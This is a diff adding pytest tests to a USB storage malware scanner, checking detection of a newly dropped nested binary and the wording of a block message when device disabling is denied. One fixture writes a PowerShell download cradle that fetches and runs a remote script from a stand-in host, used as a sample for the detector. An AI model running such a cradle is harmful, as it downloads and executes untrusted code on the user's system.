@@ -191,3 +191,60 @@ def test_storage_scan_service_deletes_malware_file(tmp_path: Path) -> None:
     assert "deleted" in completed.details["action_taken"].lower()
     assert "eicar.com" in completed.details["deleted_threats"]
 
+
+def test_storage_scan_service_detects_newly_introduced_nested_file(tmp_path: Path) -> None:
+    import time
+
+    (tmp_path / "readme.txt").write_text("Safe baseline file", encoding="utf-8")
+    sub = tmp_path / "nested"
+    sub.mkdir()
+
+    event_sink = CollectingEventSink()
+    with StorageScanService(event_sink) as service:
+        service.check_and_reschedule("usb:drive_1", str(tmp_path))
+        # Backdate scan timer slightly so the immediate incremental check passes cooldown
+        service._last_scan_times[str(tmp_path).casefold()] = time.monotonic() - 3.0
+
+        # Introduce a new disguised high-entropy binary inside a nested subfolder
+        dropped = sub / "dropper.bin"
+        dropped.write_bytes(bytes(range(256)) * 12)
+        service.check_and_reschedule("usb:drive_1", str(tmp_path))
+
+    completed = [e for e in event_sink.events if e.event_type == "scan.completed"][-1]
+    assert completed.severity is EventSeverity.WARNING
+    assert completed.details["new_files"] == ["nested/dropper.bin"]
+    assert completed.details["new_files_count"] == 1
+    assert completed.details["max_risk_score"] >= 25
+    by_path = {f["path"]: f for f in completed.details["file_analyses"]}
+    assert by_path["nested/dropper.bin"]["change_status"] == "new"
+    assert by_path["readme.txt"]["change_status"] == "existing"
+
+
+def test_storage_scan_unprivileged_block_message_does_not_claim_port_isolated(tmp_path: Path) -> None:
+    from usb_analyzer.policy.engine import PolicyEngine
+    from usb_analyzer.policy.models import PolicyMode
+    from usb_analyzer.policy.store import WhitelistStore
+
+    class DeniedBlocker:
+        def disable_device(self, device_id: str):
+            return False, "Access is denied"
+
+        def enable_device(self, device_id: str):
+            return False, "Access is denied"
+
+    bad_ps = tmp_path / "cradle.ps1"
+    bad_ps.write_text("Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.invalid/p.ps1')", encoding="utf-8")
+
+    sink = CollectingEventSink()
+    engine = PolicyEngine(store=WhitelistStore(tmp_path / "p.db"), blocker=DeniedBlocker(), mode=PolicyMode.ENFORCE)
+    service = StorageScanService(sink, policy_engine=engine, max_workers=1)
+    try:
+        service._scan("USBSTOR\\DISK&TEST\\001", str(tmp_path))
+    finally:
+        service.close()
+
+    block_ev = next(e for e in sink.events if e.event_type == "device.blocked")
+    summary = block_ev.details["summary"]
+    assert "run as Administrator to disable hardware port" in summary
+    assert "port isolated" not in summary.lower()
+
